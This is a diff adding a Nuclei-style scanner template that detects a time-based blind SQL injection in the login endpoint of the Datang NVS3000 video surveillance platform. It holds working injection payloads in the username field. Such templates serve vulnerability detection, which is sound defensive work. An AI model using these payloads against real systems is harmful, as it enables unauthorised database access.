@@ -1,0 +1,41 @@
+id: datang-nvs3000-sqli
+info:
+  name: "大唐 NVS3000 综合视频监控平台 nvsthird 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 大唐,NVS3000
+  description: |
+    Exploits a SQL injection vulnerability in the Datang NVS3000 Integrated Video Surveillance Platform. This issue allows an attacker to execute arbitrary SQL queries.
+
+http:
+  - raw:
+      - |
+        POST /nvsthird/ocxUserLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"userName":"asda' AND (SELECT 4094 FROM (SELECT(SLEEP(5)))hyJC) AND 'FYBK'='FYBK","password":"sadsa","code":"67a5"}
+      - |
+        POST /nvsthird/ocxUserLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"userName":"asda' AND (SELECT 4094 FROM (SELECT(SLEEP(8)))hyJC) AND 'FYBK'='FYBK","password":"sadsa","code":"67a5"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"userId"'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
